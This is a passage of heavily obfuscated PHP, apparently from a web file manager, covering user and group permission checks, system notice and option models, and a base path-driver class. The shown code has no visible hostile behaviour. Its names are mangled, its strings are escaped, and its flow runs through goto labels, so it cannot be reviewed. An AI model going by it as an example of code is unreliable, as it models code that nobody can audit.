$_SERVER[£ğ°ÖØø]; $äÃÇŞ‚ö = $äÃÇŞ‚ö ? $äÃÇŞ‚ö : USER_ID; $²É´°“Ò = $äÃÇŞ‚ö . $·ìÇĞïš[2167] . $òÛüúº°; static $éİ «Ç‘ = array(); if (isset($éİ «Ç‘[$²É´°“Ò])) { return $éİ «Ç‘[$²É´°“Ò]; } $¨öÙÉØº = Model($·ìÇĞïš[594])->getInfo($òÛüúº°); $–¾÷şêˆ = $this->userGroupList($äÃÇŞ‚ö); $ÔôÔİÔ = isset($–¾÷şêˆ[$òÛüúº°]) ? $–¾÷şêˆ[$òÛüúº°][$·ìÇĞïš[496]] : !1; if ($ÔôÔİÔ && Model($·ìÇĞïš[580])->authCheckAction($ÔôÔİÔ[$·ìÇĞïš[496]], $·ìÇĞïš[1975])) { $éİ «Ç‘[$²É´°“Ò] = $ÔôÔİÔ; return $ÔôÔİÔ; } $¾Î˜Û = $this->sourceAuthSelect($¨öÙÉØº[$·ìÇĞïš[90]][$·ìÇĞïš[193]]); $ù×ËÎÜ’ = $¾Î˜Û ? $this->authMake($¾Î˜Û, $äÃÇŞ‚ö) : !1; $¼à ¯µğ = $ù×ËÎÜ’ ? $ù×ËÎÜ’[$·ìÇĞïš[549]] : !1; $éİ «Ç‘[$²É´°“Ò] = $¼à ¯µğ ? $¼à ¯µğ : $ÔôÔİÔ; return $éİ «Ç‘[$²É´°“Ò]; } public function authOwnerApply($îğ‡¸ìÀ) { $şˆŠĞ²Ø =& $_SERVER[£ğ°ÖØø]; if (empty($îğ‡¸ìÀ[$şˆŠĞ²Ø[496]]) || isset($îğ‡¸ìÀ[$şˆŠĞ²Ø[2168]]) && $îğ‡¸ìÀ[$şˆŠĞ²Ø[2168]]) { return $îğ‡¸ìÀ; } if (AuthModel::authCheckRoot($îğ‡¸ìÀ[$şˆŠĞ²Ø[496]][$şˆŠĞ²Ø[497]])) { return $îğ‡¸ìÀ; } $ïß©¶æö = Model($şˆŠĞ²Ø[1401])->parentLevelArray($îğ‡¸ìÀ[$şˆŠĞ²Ø[593]]); $ïß©¶æö = array_merge(array($îğ‡¸ìÀ[$şˆŠĞ²Ø[193]]), array_reverse($ïß©¶æö)); $ûË×°…« = $this->sourceAuthSelect($ïß©¶æö); $àˆíöö = array(); $¼í—‚™¸ = array(); foreach ($ûË×°…« as $ë—Ü¼™ => $Ò×÷èŸğ) { $öÂ•©çÉ = $this->authFolderOwnerUser($Ò×÷èŸğ); $àˆíöö[$ë—Ü¼™] = $öÂ•©çÉ; $¼í—‚™¸ = array_merge($¼í—‚™¸, $öÂ•©çÉ[$şˆŠĞ²Ø[671]]); if ($öÂ•©çÉ[$şˆŠĞ²Ø[2169]]) { break; } } if (count($¼í—‚™¸) == 0) { $¼í—‚™¸ = $this->authFolderOwnerGroup($îğ‡¸ìÀ[$şˆŠĞ²Ø[578]]); } $¼í—‚™¸ = array_unique($¼í—‚™¸); if (AuthModel::authCheckRoot($îğ‡¸ìÀ[$şˆŠĞ²Ø[496]][$şˆŠĞ²Ø[497]])) { $¼í—‚™¸[] = USER_ID; } $îğ‡¸ìÀ[$şˆŠĞ²Ø[496]][$şˆŠĞ²Ø[2170]] = Model($şˆŠĞ²Ø[586])->userListInfo($¼í—‚™¸); return $îğ‡¸ìÀ; } private function authFolderOwnerGroup($ùÏ ¬©Ü) { $Ìş±İßÇ =& $_SERVER[£ğ°ÖØø]; $ùÆà›à = Model($Ìş±İßÇ[2048])->where(array($Ìş±İßÇ[1954] => $ùÏ ¬©Ü))->select(); $¥à¹‘–› = array(); if (!$ùÆà›à) { return $¥à¹‘–›; } foreach ($ùÆà›à as $İì§—ˆ¸) { $íÅ‘èãê = $this->authInfo($İì§—ˆ¸); if (AuthModel::authCheckRoot($íÅ‘èãê[$Ìş±İßÇ[496]])) { $¥à¹‘–›[] = $İì§—ˆ¸[$Ìş±İßÇ[1755]]; } } return $¥à¹‘–›; } private function authFolderOwnerUser($ò¥“šà•) { $Ê¾ÊşÈ =& $_SERVER[£ğ°ÖØø]; $¬ıØ™¥Ğ = array(); $é¯å¯Ç‰ = !1; foreach ($ò¥“šà• as $Ä“ü—Ğ) { $Æ¡¶™õö = $this->authInfo($Ä“ü—Ğ); if ($Ä“ü—Ğ[$Ê¾ÊşÈ[578]] == $Ê¾ÊşÈ[228]) { $é¯å¯Ç‰ = !0; } if ($Ä“ü—Ğ[$Ê¾ÊşÈ[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Æ¡¶™õö[$Ê¾ÊşÈ[496]])) { $¬ıØ™¥Ğ[] = $Ä“ü—Ğ[$Ê¾ÊşÈ[578]]; } } } return array($Ê¾ÊşÈ[671] => $¬ıØ™¥Ğ, $Ê¾ÊşÈ[2169] => $é¯å¯Ç‰); } public function authMake($ãŸ–·Ç, $µ„àü¾ = false) { $ßä‹æÅò =& $_SERVER[£ğ°ÖØø]; $ºË³”ğí = $this->authArrayCheck($ãŸ–·Ç, $µ„àü¾); if ($ºË³”ğí[$ßä‹æÅò[2171]]) { $ºË³”ğí[$ßä‹æÅò[2171]] = $this->sourceAuthInfo($ºË³”ğí[$ßä‹æÅò[2171]]); } return $ºË³”ğí; } public function authArrayCheck($‚¦Æ¼Å—, $¥ûü×Ê• = false) { $ûú’Ü€ë =& $_SERVER[£ğ°ÖØø]; if (!$‚¦Æ¼Å—) { return array($ûú’Ü€ë[497] => 0, $ûú’Ü€ë[549] => !1); } $¥ûü×Ê• = $¥ûü×Ê• ? $¥ûü×Ê• : USER_ID; $ÀØ—ğúÜ = 0; $€Ñàğõß = 0; $ı€ÈÜßÇ = 0; $ëïˆ£·Î = 0; $ûÏ¢«Î = 0; $Ùº›¹ÆÁ = 0; $’æ¹¹ = 1000; $êŸ¡åì³ = 0; $«ŸÅĞâÕ = 0; $Ãºİçã™ = 0; $³İïòÄ— = 0; $õ…Í¹‰å = array($ûú’Ü€ë[193] => 0); foreach ($‚¦Æ¼Å— as $õ…Í¹‰å) { $äé©¤³Ä = $this->authInfo($õ…Í¹‰å); if (!$äé©¤³Ä) { continue; } $Ûİ™›ÈÆ = $õ…Í¹‰å[$ûú’Ü€ë[578]]; $¹ñƒÀ¨ = intval($äé©¤³Ä[$ûú’Ü€ë[496]]); if ($õ…Í¹‰å[$ûú’Ü€ë[190]] == SourceModel::TYPE_USER && $Ûİ™›ÈÆ == $¥ûü×Ê•) { $ÀØ—ğúÜ = !0; $ı€ÈÜßÇ = $äé©¤³Ä; $€Ñàğõß = $¹ñƒÀ¨; } else { if ($õ…Í¹‰å[$ûú’Ü€ë[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ûİ™›ÈÆ, $¥ûü×Ê•)) { $ëïˆ£·Î = !0; $ÖĞÜ¢¾Ê = $this->groupStepToUserGroup($Ûİ™›ÈÆ, $¥ûü×Ê•); if ($ÖĞÜ¢¾Ê < $’æ¹¹) { $’æ¹¹ = $ÖĞÜ¢¾Ê; $ûÏ¢«Î = $¹ñƒÀ¨; $Ùº›¹ÆÁ = $äé©¤³Ä; $êŸ¡åì³ = $Ûİ™›ÈÆ; } if ($ÖĞÜ¢¾Ê == $’æ¹¹ && $¹ñƒÀ¨ >= $ûÏ¢«Î) { $ûÏ¢«Î = $¹ñƒÀ¨; $Ùº›¹ÆÁ = $äé©¤³Ä; $êŸ¡åì³ = $Ûİ™›ÈÆ; } } else { if ($Ûİ™›ÈÆ == $ûú’Ü€ë[228]) { $«ŸÅĞâÕ = !0; $³İïòÄ— = $äé©¤³Ä; $Ãºİçã™ = $¹ñƒÀ¨; } } } } if ($ÀØ—ğúÜ) { $¶¶ıÁºÆ = $€Ñàğõß; $äé©¤³Ä = $ı€ÈÜßÇ; $óüı = LNG($ûú’Ü€ë[2172]); } else { if ($ëïˆ£·Î) { $¶¶ıÁºÆ = $ûÏ¢«Î; $äé©¤³Ä = $Ùº›¹ÆÁ; $ÄÉßšèŠ = Model($ûú’Ü€ë[594])->getInfo($êŸ¡åì³); $óüı = $ûú’Ü€ë[176] . $ÄÉßšèŠ[$ûú’Ü€ë[598]] . $ûú’Ü€ë[2173] . LNG($ûú’Ü€ë[2174]); } else { if ($«ŸÅĞâÕ) { $¶¶ıÁºÆ = $Ãºİçã™; $äé©¤³Ä = $³İïòÄ—; $óüı = LNG($ûú’Ü€ë[2144]); } else { $¶¶ıÁºÆ = 0; $äé©¤³Ä = !1; $óüı = $ûú’Ü€ë[12]; } } } $ôà×¨¥ï = array($ûú’Ü€ë[2164] => intval($¶¶ıÁºÆ), $ûú’Ü€ë[2147] => $äé©¤³Ä, $ûú’Ü€ë[2165] => $óüı, $ûú’Ü€ë[2156] => $õ…Í¹‰å[$ûú’Ü€ë[193]]); return $ôà×¨¥ï; } private function groupContainUser($âŞößô³, $ú×ø…§ = false) { return in_array($âŞößô³, $this->userGroupParents($ú×ø…§)); } private function groupStepToUserGroup($ƒÈŸÈÉ›, $·„¡ÄŠô = false) { $êÒ›Ä½ =& $_SERVER[£ğ°ÖØø]; $åï²å” = $this->userGroupList($·„¡ÄŠô); $ğ¶Ü†ğ‚ = 1000; $üéâÉâ = $GLOBALS[$êÒ›Ä½[6]][$êÒ›Ä½[92]][$êÒ›Ä½[2061]] == 1; $ê‹¬«¡ù = $üéâÉâ ? 3 : 2; foreach ($åï²å” as $›§Ëû) { if ($›§Ëû[$êÒ›Ä½[1954]] == $ƒÈŸÈÉ›) { return 0; } $Ñ¸ƒÆ‰í = explode($êÒ›Ä½[50], trim($›§Ëû[$êÒ›Ä½[593]], $êÒ›Ä½[50])); if ($Ñ¸ƒÆ‰í[0] == $êÒ›Ä½[228] && count($Ñ¸ƒÆ‰í) > $ê‹¬«¡ù) { $¼¥–Óî€ = array_reverse(array_slice($Ñ¸ƒÆ‰í, $ê‹¬«¡ù)); $íŒµèıÁ = array_search($ƒÈŸÈÉ›, $¼¥–Óî€); if ($íŒµèıÁ !== !1 && $íŒµèıÁ + 1 <= $ğ¶Ü†ğ‚) { $ğ¶Ü†ğ‚ = $íŒµèıÁ + 1; } } } return $ğ¶Ü†ğ‚; } private function userGroupList($äÖ²é­™ = false) { $”®€«Úâ =& $_SERVER[£ğ°ÖØø]; static $ğã‹ ”— = array(); if (isset($ğã‹ ”—[$äÖ²é­™])) { return $ğã‹ ”—[$äÖ²é­™]; } $–ş™Ğ™½ = Model($”®€«Úâ[607])->getInfo($äÖ²é­™); $ğã‹ ”—[$äÖ²é­™] = array_to_keyvalue($–ş™Ğ™½[$”®€«Úâ[2145]], $”®€«Úâ[1954]); return $ğã‹ ”—[$äÖ²é­™]; } public function userGroupParents($Çñ­±Şš) { $¸‘é¯ıÍ =& $_SERVER[£ğ°ÖØø]; static $ÈÃ“ÌµĞ = array(); $Çñ­±Şš = $Çñ­±Şš ? $Çñ­±Şš : USER_ID; if (isset($ÈÃ“ÌµĞ[$Çñ­±Şš])) { return $ÈÃ“ÌµĞ[$Çñ­±Şš]; } $ù—ªÄ¨¡ = $this->userGroupList($Çñ­±Şš); $ıóóúø = array(); $¸Œ±ôş« = $GLOBALS[$¸‘é¯ıÍ[6]][$¸‘é¯ıÍ[92]][$¸‘é¯ıÍ[2061]] == 1; $¡§½êŞÄ = $¸Œ±ôş« ? 3 : 2; foreach ($ù—ªÄ¨¡ as $ìÔ±•Ëâ) { $×Ïó¤»„ = array($ìÔ±•Ëâ[$¸‘é¯ıÍ[1954]]); $œÛêãİÜ = explode($¸‘é¯ıÍ[50], trim($ìÔ±•Ëâ[$¸‘é¯ıÍ[593]], $¸‘é¯ıÍ[50])); if ($œÛêãİÜ[0] == $¸‘é¯ıÍ[228] && count($œÛêãİÜ) > $¡§½êŞÄ) { $²Ø³ÛÅ = array_slice($œÛêãİÜ, $¡§½êŞÄ); $×Ïó¤»„ = array_merge($×Ïó¤»„, array_reverse($²Ø³ÛÅ)); } $ıóóúø = array_merge($ıóóúø, $×Ïó¤»„); } $ÈÃ“ÌµĞ[$Çñ­±Şš] = array_unique($ıóóúø); return $ÈÃ“ÌµĞ[$Çñ­±Şš]; } public function authTargetInfoMake($Û¢Á½®) { $÷€ş³ï¤ =& $_SERVER[£ğ°ÖØø]; $ªçñİ» = array(); $¼İ×ğúÈ = array(); foreach ($Û¢Á½® as $±şï¤•²) { if ($±şï¤•²[$÷€ş³ï¤[190]] == SourceModel::TYPE_USER) { $ªçñİ»[] = intval($±şï¤•²[$÷€ş³ï¤[578]]); } else { if ($±şï¤•²[$÷€ş³ï¤[190]] == SourceModel::TYPE_GROUP) { $¼İ×ğúÈ[] = intval($±şï¤•²[$÷€ş³ï¤[578]]); } } } if ($ªçñİ») { $ªçñİ» = Model($÷€ş³ï¤[586])->userListInfo($ªçñİ»); } if ($¼İ×ğúÈ) { $şË×ŒÉÎ = array($÷€ş³ï¤[2046] => array($÷€ş³ï¤[501], $¼İ×ğúÈ)); $¼İ×ğúÈ = Model($÷€ş³ï¤[594])->field($÷€ş³ï¤[2175])->where($şË×ŒÉÎ)->select(); $¼İ×ğúÈ = array_to_keyvalue($¼İ×ğúÈ, $÷€ş³ï¤[1954]); } return array($÷€ş³ï¤[2176] => $ªçñİ», $÷€ş³ï¤[2177] => $¼İ×ğúÈ); } public function authInfo($Ò¿¯×æÜ) { $˜ÁÔ‡¶à =& $_SERVER[£ğ°ÖØø]; if ($Ò¿¯×æÜ[$˜ÁÔ‡¶à[2062]]) { $ü›©ÖŒÊ = Model($˜ÁÔ‡¶à[580])->listData($Ò¿¯×æÜ[$˜ÁÔ‡¶à[2062]]); if (!$ü›©ÖŒÊ) { return !1; $Öñü€ˆ‹ = Model($˜ÁÔ‡¶à[580])->listData(); $¿®¨–ï = array_filter_by_field($Öñü€ˆ‹, $˜ÁÔ‡¶à[496], $˜ÁÔ‡¶à[228]); return $¿®¨–ï; } $ô›í„¶÷ = array_field_key($ü›©ÖŒÊ, array($˜ÁÔ‡¶à[484], $˜ÁÔ‡¶à[32], $˜ÁÔ‡¶à[496], $˜ÁÔ‡¶à[1977], $˜ÁÔ‡¶à[1978])); $ô›í„¶÷[$˜ÁÔ‡¶à[2178]] = $Ò¿¯×æÜ; return $ô›í„¶÷; } else { return array($˜ÁÔ‡¶à[502] => 0, $˜ÁÔ‡¶à[1960] => $Ò¿¯×æÜ[$˜ÁÔ‡¶à[2122]], $˜ÁÔ‡¶à[503] => $˜ÁÔ‡¶à[12], $˜ÁÔ‡¶à[1977] => $˜ÁÔ‡¶à[2179]); } } } goto D¸‹¯×Ÿ¥ñ; F½°ÜÜ‡†É: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x6e\x6f\x74\x69\143\x65\114\151\x73\164"; public $field = array("\156\141\x6d\x65", "\x63\157\156\164\145\156\164", "\x61\x75\x74\x68", "\x6d\157\x64\x65", "\x74\151\x6d\x65", "\x74\x79\160\x65", "\x6c\x65\166\145\x6c", "\145\x6e\x61\142\x6c\x65", "\163\x6f\x72\164"); public function listData($ÑğÁÌ¼‡ = false, $—­Û¹ÊŒ = "\163\x6f\x72\164", $‡„¨§àÄ = false) { return parent::listData($ÑğÁÌ¼‡, $—­Û¹ÊŒ, $‡„¨§àÄ); } public function add($™¤ØÚ•›) { $ª«‡õ§ =& $_SERVER[£ğ°ÖØø]; $û¬ØÊ = time(); if ($™¤ØÚ•›[$ª«‡õ§[16]] == $ª«‡õ§[2416]) { $û¬ØÊ = strtotime($™¤ØÚ•›[$ª«‡õ§[206]]); } $™¤ØÚ•›[$ª«‡õ§[206]] = $û¬ØÊ; return parent::insert($™¤ØÚ•›); } public function update($øÃ”éŸ©, $¡Ğ×ô¦õ) { $†µ³ªìß =& $_SERVER[£ğ°ÖØø]; $”ç¦Û¡Ø = $this->listData($øÃ”éŸ©); if (!$”ç¦Û¡Ø) { return !1; } $¦º¬›· = time(); if ($¡Ğ×ô¦õ[$†µ³ªìß[16]] == $†µ³ªìß[2416]) { $¦º¬›· = strtotime($¡Ğ×ô¦õ[$†µ³ªìß[206]]); } $¡Ğ×ô¦õ[$†µ³ªìß[206]] = $¦º¬›·; return parent::update($øÃ”éŸ©, $¡Ğ×ô¦õ); } public function remove($É‡”­–›) { $ûÙ¼…×ñ = $this->listData($É‡”­–›); if (!$ûÙ¼…×ñ || $ûÙ¼…×ñ[$_SERVER[£ğ°ÖØø][191]]) { return !1; } return parent::remove($É‡”­–›); } public function sort($Æ§Š¨Ù™, $¼îĞä) { return parent::update($Æ§Š¨Ù™, $¼îĞä); } public function enable($¾®æğªü, $à¡¦Ÿ°…) { return parent::update($¾®æğªü, array($_SERVER[£ğ°ÖØø][2417] => $à¡¦Ÿ°…)); } private function initUserOption() { $õ•¡œÍ =& $_SERVER[£ğ°ÖØø]; $this->optionType = $õ•¡œÍ[2418]; $this->modelType = $õ•¡œÍ[2419]; $this->field = array($õ•¡œÍ[2420], $õ•¡œÍ[32], $õ•¡œÍ[206], $õ•¡œÍ[33], $õ•¡œÍ[2421], $õ•¡œÍ[814], $õ•¡œÍ[226]); } public function userNoticeGet($‡ùÌßåå = false) { $this->initUserOption(); return parent::listData($‡ùÌßåå, $_SERVER[£ğ°ÖØø][484], !0); } public function userNoticeAdd($‘ÓûÉÒ) { $øŠƒÆùµ =& $_SERVER[£ğ°ÖØø]; $this->initUserOption(); $¸í›ôÖı = $this->findByKey($øŠƒÆùµ[2420], $‘ÓûÉÒ[$øŠƒÆùµ[484]]); if ($¸í›ôÖı) { return !0; } $ÓÌ¹ı¥ì = array($øŠƒÆùµ[2420] => $‘ÓûÉÒ[$øŠƒÆùµ[484]], $øŠƒÆùµ[32] => $‘ÓûÉÒ[$øŠƒÆùµ[32]], $øŠƒÆùµ[206] => $‘ÓûÉÒ[$øŠƒÆùµ[206]], $øŠƒÆùµ[33] => isset($‘ÓûÉÒ[$øŠƒÆùµ[33]]) ? $‘ÓûÉÒ[$øŠƒÆùµ[33]] : 1, $øŠƒÆùµ[2421] => isset($‘ÓûÉÒ[$øŠƒÆùµ[2421]]) ? $‘ÓûÉÒ[$øŠƒÆùµ[2421]] : 0, $øŠƒÆùµ[814] => 0, $øŠƒÆùµ[226] => 0); return parent::insert($ÓÌ¹ı¥ì); } public function userNoticeEdit($ó Ò­Ü, $£®ÖÆ) { $this->initUserOption(); return parent::update($ó Ò­Ü, $£®ÖÆ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\145\x6d\x5f\x6f\x70\164\x69\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\x6c\x65", "\162\157\x6c\145\107\162\x6f\x75\x70", "\x72\145\147\x69\163\164", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ü¯ÕÕ›±) { return "\x53\171\163\x74\145\155\x4f\160\164\x69\157\156\137{$ü¯ÕÕ›±}"; } protected function optionDefault($üƒûÔçÕ = '') { $¿²Ôû”õ =& $_SERVER[£ğ°ÖØø]; if ($üƒûÔçÕ == $¿²Ôû”õ[12]) { return $GLOBALS[$¿²Ôû”õ[6]][$¿²Ôû”õ[466]]; } } } class SystemRecordModel extends ModelBaseLight { } goto CŞî¢Äà‹„; b‹—¤  î: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÚêìÅÔò =& $_SERVER[£ğ°ÖØø]; $this->objectDriver = array($ÚêìÅÔò[60], $ÚêìÅÔò[61], $ÚêìÅÔò[62], $ÚêìÅÔò[63], $ÚêìÅÔò[64], $ÚêìÅÔò[65], $ÚêìÅÔò[66], $ÚêìÅÔò[67], $ÚêìÅÔò[68], $ÚêìÅÔò[69], $ÚêìÅÔò[70], $ÚêìÅÔò[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÍáœÌŸ ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÍáœÌŸ , $_SERVER[£ğ°ÖØø][8]); } return $ÍáœÌŸ ; } public function iconvApp($†Êæ÷) { return $†Êæ÷; } public function iconvSystem($Å“ÔÑñµ) { return $Å“ÔÑñµ; } public function iconvTo($ïåÜ–Ì›, $“—ü˜‚ú, $–Ööí€) { $‚ÛÚÕÑ“ =& $_SERVER[£ğ°ÖØø]; if (!$ïåÜ–Ì› || !function_exists($‚ÛÚÕÑ“[72])) { return $ïåÜ–Ì›; } static $Ñüµ¬š• = array(); $ˆ¥½²¤ = $“—ü˜‚ú . $‚ÛÚÕÑ“[73] . $–Ööí€ . $‚ÛÚÕÑ“[74] . $ïåÜ–Ì›; if (isset($Ñüµ¬š•[$ˆ¥½²¤])) { return $Ñüµ¬š•[$ˆ¥½²¤]; } if (function_exists($‚ÛÚÕÑ“[75])) { $ŠİÈû«æ = @mb_convert_encoding($ïåÜ–Ì›, $–Ööí€, $“—ü˜‚ú); } else { $ŠİÈû«æ = @iconv($“—ü˜‚ú, $–Ööí€, $ïåÜ–Ì›); } $ŠİÈû«æ = $ŠİÈû«æ ? $ŠİÈû«æ : $ïåÜ–Ì›; if (strstr($ŠİÈû«æ, $‚ÛÚÕÑ“[76])) { $ŠİÈû«æ = str_replace($‚ÛÚÕÑ“[76], $‚ÛÚÕÑ“[11], $ŠİÈû«æ); } $Ñüµ¬š•[$“—ü˜‚ú . $‚ÛÚÕÑ“[73] . $–Ööí€ . $‚ÛÚÕÑ“[74] . $ïåÜ–Ì›] = $ŠİÈû«æ; $Ñüµ¬š•[$–Ööí€ . $‚ÛÚÕÑ“[73] . $“—ü˜‚ú . $‚ÛÚÕÑ“[74] . $ïåÜ–Ì›] = $ïåÜ–Ì›; $Ñüµ¬š•[$–Ööí€ . $‚ÛÚÕÑ“[73] . $“—ü˜‚ú . $‚ÛÚÕÑ“[74] . $ŠİÈû«æ] = $ïåÜ–Ì›; $Ñüµ¬š•[$“—ü˜‚ú . $‚ÛÚÕÑ“[73] . $–Ööí€ . $‚ÛÚÕÑ“[74] . $ŠİÈû«æ] = $ŠİÈû«æ; return $ŠİÈû«æ; } public function getPathInner($î™Ñ³Ï´) { $ ­ëÍ‚ = IO::init($î™Ñ³Ï´); return $ ­ëÍ‚->path; } public function getPathOuter($ğ´İóŞ) { $è¤Áƒ¡ =& $_SERVER[£ğ°ÖØø]; $Ë‘ÕÓ¦Í = strlen(trim($this->pathBase, $è¤Áƒ¡[8])); $ğ´İóŞ = substr(trim($ğ´İóŞ, $è¤Áƒ¡[8]), $Ë‘ÕÓ¦Í); return $this->pathDriver . $è¤Áƒ¡[8] . ltrim($ğ´İóŞ, $è¤Áƒ¡[8]); } public function isParentOf($÷©’‹áÈ, $íÓ©²ê®) { $âÛÓÆÆ =& $_SERVER[£ğ°ÖØø]; $÷©’‹áÈ = rtrim(strtolower($÷©’‹áÈ), $âÛÓÆÆ[8]) . $âÛÓÆÆ[8]; $íÓ©²ê® = rtrim(strtolower($íÓ©²ê®), $âÛÓÆÆ[8]) . $âÛÓÆÆ[8]; $Ïšø’àç = strpos($íÓ©²ê®, $÷©’‹áÈ) === 0; return $Ïšø’àç; } public function getType() { $æÓ¿Ä‹º =& $_SERVER[£ğ°ÖØø]; $œÊ¨ªŸ´ = str_replace($æÓ¿Ä‹º[77], $æÓ¿Ä‹º[12], get_class($this)); return strtolower($œÊ¨ªŸ´); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($îÇöœÌÖ, $ñ«‡) { $üüšŠôƒ =& $_SERVER[£ğ°ÖØø]; $‹Îœ¢ÏÉ = rtrim($îÇöœÌÖ, $üüšŠôƒ[8]) . $üüšŠôƒ[8] . $ñ«‡; $Œ±Ú = $this->exist($‹Îœ¢ÏÉ); return $Œ±Ú ? $‹Îœ¢ÏÉ : !1; } public function setModifyTime($ŒáÆÍ†¥, $ú­ÉØ¬• = '') { } public function renameObject($ŸúãëïË, $–âá„“´) { $üèö¤  = $–âá„“´; $ŸúãëïË = $this->getPathOuter($ŸúãëïË); $–âá„“´ = $this->pathFather($ŸúãëïË) . $–âá„“´; $Ÿö©¥—  = IO::copy($ŸúãëïË, $this->pathFather($ŸúãëïË), REPEAT_RENAME_FOLDER, $üèö¤ ); if ($Ÿö©¥— ) { IO::remove($ŸúãëïË); } return $Ÿö©¥—  ? $–âá„“´ : !1; } public function tempFile($£îå­÷ = '', $®šÚ÷ìû = '') { if (!$£îå­÷) { $£îå­÷ = rand_string(15); } $ İŞµ« = TEMP_FILES . rand_string(15) . $_SERVER[£ğ°ÖØø][8]; @mkdir($ İŞµ«, DEFAULT_PERRMISSIONS, !0); $Ä¸Àµø = $ İŞµ« . $£îå­÷; @touch($Ä¸Àµø); if ($®šÚ÷ìû) { file_put_contents($Ä¸Àµø, $®šÚ÷ìû); } return $Ä¸Àµø; } public function tempFileRemve($½î×½À») { @unlink($½î×½À»); @rmdir($this->pathFather($½î×½À»)); } public function mkfile($–»ÍĞˆ, $õÑ”¸Æ = '', $á¸´û³Ø = REPEAT_RENAME) { } public function mkdir($Ç¶º û‡, $Ü“îÑóÑ = REPEAT_SKIP) { } public function delFile($™ıá°›ì) { } public function delFolder($¾¬„ÏàÜ) { } public function copyFile($Öå¦™Ì«, $êË¿ü–³) { } public function moveFile($ÆÌÖ¿õÛ, $ş£å†Õ¦) { } public function remove($ÊÛ’¾) { if ($this->isFile($ÊÛ’¾)) { return $this->delFile($ÊÛ’¾); } return $this->delFolder($ÊÛ’¾); } public function rename($ÏÉÊò, $ÃÕßÛÄ¶) { } public function exist($¶­ÜÓô“) { } public function findByHash($Áéø´ÕÅ = '', $«æÌŸí = '') { return !1; } public function isFile($É±ïÚÈ—) { } public function isFolder($Äşà³¿) { } public function size($®²şèòÎ) { } public function info($©‚˜­¥Ú) { } public function infoSimple($²ÖíëÑî) { return $this->info($²ÖíëÑî); } public function infoAuth($„ù¼½¨) { return $this->info($„ù¼½¨); } public function infoFull($şæÃ½÷¯) { return $this->info($şæÃ½÷¯); } public function infoFullSimple($ÍĞ†˜Ó¥) { return $this->info($ÍĞ†˜Ó¥); } public function infoWithChildren($üßèÉ) { $ä†šıÃê =& $_SERVER[£ğ°ÖØø]; static $şõèù÷ = array(); if (isset($şõèù÷[$üßèÉ])) { return $şõèù÷[$üßèÉ]; } $®Ï‡Óû‚ = $this->info($üßèÉ); if ($®Ï‡Óû‚ && $®Ï‡Óû‚[$ä†šıÃê[33]] == $ä†šıÃê[78]) { $¸é´ßÕ£ = array($ä†šıÃê[79] => 0, $ä†šıÃê[80] => 0, $ä†šıÃê[81] => 0); $this->infoChildren($üßèÉ, $¸é´ßÕ£); $®Ï‡Óû‚[$ä†šıÃê[79]] = $¸é´ßÕ£[$ä†šıÃê[79]]; $®Ï‡Óû‚[$ä†šıÃê[82]] = array($ä†šıÃê[83] => $¸é´ßÕ£[$ä†šıÃê[80]], $ä†šıÃê[84] => $¸é´ßÕ£[$ä†šıÃê[81]]); $şõèù÷[$üßèÉ] = $®Ï‡Óû‚; } return $®Ï‡Óû‚; } public function listPath($óÈÂâ×ç, $ÖÑ¼¬ì¦ = false) { } public function has($•ô‹äáÛ, $‹õÌ…¥• = false, $Ò¬šĞØ¡ = false) { } public function canRead($¥¿ÉùÌ) { } public function canWrite($èÁöÊã) { } public function getContent($­‡±Ÿî ) { } public function setContent($¨›¤ËÔ˜, $ÄàÕ¹µë = '') { } protected function infoChildren($ïµ°©», &$ãßù©µ) { $€úú±ÑÏ =& $_SERVER[£ğ°ÖØø]; check_abort_echo(); $º‚³ÙºÏ = $this->listPath($ïµ°©», !0); $º‚³ÙºÏ = array_merge($º‚³ÙºÏ[$€úú±ÑÏ[85]], $º‚³ÙºÏ[$€úú±ÑÏ[86]]); foreach ($º‚³ÙºÏ as $Ÿñ½ˆø£) { if ($Ÿñ½ˆø£[$€úú±ÑÏ[33]] == $€úú±ÑÏ[78]) { $ãßù©µ[$€úú±ÑÏ[81]]++; $ÎÆ¼ö· = $this->getPathInner($Ÿñ½ˆø£[$€úú±ÑÏ[87]]); $this->infoChildren($ÎÆ¼ö·, $ãßù©µ); } else { $ãßù©µ[$€úú±ÑÏ[80]]++; $ãßù©µ[$€úú±ÑÏ[79]] += $Ÿñ½ˆø£[$€úú±ÑÏ[79]]; } } } public function fileSubstr($“ÎË¨“©, $Â÷ œºá, $ò†Ÿ…ı) { } public function listAll($ĞËàà¡¯) { } public function listAllMake($µ¼ñÒº©, &$©õı ®¬) { $¬¿·Ÿ—ê =& $_SERVER[£ğ°ÖØø]; check_abort_echo(); $à°Õ Üä = $this->listPath($µ¼ñÒº©, !0); if (!$à°Õ Üä) { return; } $âÈ« = array_merge($à°Õ Üä[$¬¿·Ÿ—ê[85]], $à°Õ Üä[$¬¿·Ÿ—ê[86]]); foreach ($âÈ« as $Ü÷Î´ÂÀ) { $×‘áÀ“› = $Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[33]] == $¬¿·Ÿ—ê[78]; $ Åúñ¾ = array($¬¿·Ÿ—ê[87] => $Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[87]], $¬¿·Ÿ—ê[78] => $×‘áÀ“›); if (isset($Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[79]])) { $ Åúñ¾[$¬¿·Ÿ—ê[79]] = $Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[79]]; } if (isset($Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[88]])) { $ Åúñ¾[$¬¿·Ÿ—ê[88]] = $Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[88]]; } if (!$×‘áÀ“›) { $©õı ®¬[] = $ Åúñ¾; continue; } $©õı ®¬[] = $ Åúñ¾; $ªõˆ°Ä = $Ü÷Î´ÂÀ[$¬¿·Ÿ—ê[87]]; 